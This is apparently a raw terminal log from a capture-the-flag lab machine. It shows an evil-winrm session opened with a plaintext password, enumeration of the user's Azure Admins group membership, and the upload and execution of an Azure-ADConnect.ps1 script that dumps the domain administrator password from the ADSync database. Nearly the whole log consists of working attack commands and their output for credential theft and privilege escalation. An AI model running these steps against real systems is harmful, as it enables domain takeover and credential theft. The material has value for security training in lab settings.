allenwest1@debian:~/Desktop$ evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> ls
*Evil-WinRM* PS C:\Users\mhope\Documents> cd desktop
Cannot find path 'C:\Users\mhope\Documents\desktop' because it does not exist.
At line:1 char:1
+ cd desktop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\mhope\Documents\desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\mhope\Documents> ls
*Evil-WinRM* PS C:\Users\mhope\Documents> ls -al
A parameter cannot be found that matches parameter name 'al'.                                                                                       
At line:1 char:4                                                                                                                                    
+ ls -al                                                                                                                                            
+    ~~~                                                                                                                                            
    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException                                                       
    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand                                              
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..                                                                                                     
*Evil-WinRM* PS C:\Users\mhope> ls                                                                                                                  
                                                                                                                                                    
                                                                                                                                                    
    Directory: C:\Users\mhope                                                                                                                       
                                                                                                                                                    
                                                                                                                                                    
Mode                LastWriteTime         Length Name                                                                                               
----                -------------         ------ ----                                                                                               
d-----         1/3/2020   5:35 AM                .Azure                                                                                             
d-r---         1/3/2020   5:24 AM                3D Objects                                                                                         
d-r---         1/3/2020   5:24 AM                Contacts                                                                                           
d-r---         1/3/2020   5:47 AM                Desktop                                                                                            
d-r---         1/3/2020   5:24 AM                Documents
d-r---         1/3/2020   5:24 AM                Downloads
d-r---         1/3/2020   5:24 AM                Favorites
d-r---         1/3/2020   5:24 AM                Links
d-r---         1/3/2020   5:24 AM                Music
d-r---         1/3/2020   5:24 AM                Pictures
d-r---         1/3/2020   5:24 AM                Saved Games
d-r---         1/3/2020   5:24 AM                Searches
d-r---         1/3/2020   5:24 AM                Videos


*Evil-WinRM* PS C:\Users\mhope> cd Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


cat user*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
********************************
*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\mhope\Desktop> echo MEGABANK\Azure Admins 
MEGABANK\Azure
Admins
*Evil-WinRM* PS C:\Users\mhope\Desktop> upload Azure-ADConnect.ps1
Info: Uploading Azure-ADConnect.ps1 to C:\Users\mhope\Desktop\Azure-ADConnect.ps1                         

                                                             
Data: 2928 bytes of 2928 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/16/2020   2:00 PM           2198 Azure-ADConnect.ps1
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> ./Azure-ADConnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Desktop> Azure-ADConnect -server 127.0.0.1 -db ADSync
The term 'Azure-ADConnect' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Azure-ADConnect -server 127.0.0.1 -db ADSync
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Azure-ADConnect:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\mhope\Desktop> import-module Azure-ADConnect.ps1
The specified module 'Azure-ADConnect.ps1' was not loaded because no valid module file was found in any module directory.
At line:1 char:1
+ import-module Azure-ADConnect.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (Azure-ADConnect.ps1:String) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
*Evil-WinRM* PS C:\Users\mhope\Desktop> import-module ./Azure-ADConnect.ps1 
*Evil-WinRM* PS C:\Users\mhope\Desktop> Azure-ADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
.
.
.
// !!!!
